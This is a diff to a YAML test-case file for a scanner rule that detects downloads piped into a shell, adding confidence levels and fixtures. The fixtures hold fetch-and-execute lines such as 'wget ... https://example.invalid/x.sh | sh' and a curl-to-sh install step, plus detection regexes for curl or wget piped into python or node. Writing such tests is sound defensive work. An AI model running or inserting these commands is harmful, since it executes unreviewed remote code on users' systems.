@@ -19,7 +19,24 @@ RC-DLX-001:
       files:
         tools/bootstrap.py: |
           os.system("wget -qO- https://example.invalid/x.sh | sh")
-      expect: [{path: tools/bootstrap.py, line: 1}]
+      expect: [{path: tools/bootstrap.py, line: 1, confidence: medium}]
+    - name: detection pattern of a scanner in a raw string is reported with low confidence
+      files:
+        scanner/patterns.py: |
+          PATTERNS = [
+              (r"curl\s+[^|]*\|\s*(?:sudo\s+)?(?:python|python3|node)", 0.9),
+          ]
+      expect: [{path: scanner/patterns.py, line: 2, confidence: low}]
+    - name: detection pattern in a JavaScript regex literal is reported with low confidence
+      files:
+        src/rules.js: |
+          const pipe = /wget\s+[^|]*\|\s*(?:node|python)/;
+      expect: [{path: src/rules.js, line: 1, confidence: low}]
+    - name: regex syntax outside a string does not lower the confidence
+      files:
+        install.sh: |
+          curl -fsSL https://example.invalid/i.sh | grep -v '^\s*#' | sh
+      expect: [{path: install.sh, line: 1, confidence: medium}]
   negative:
     - name: download piped into a shell in a comment
       files:
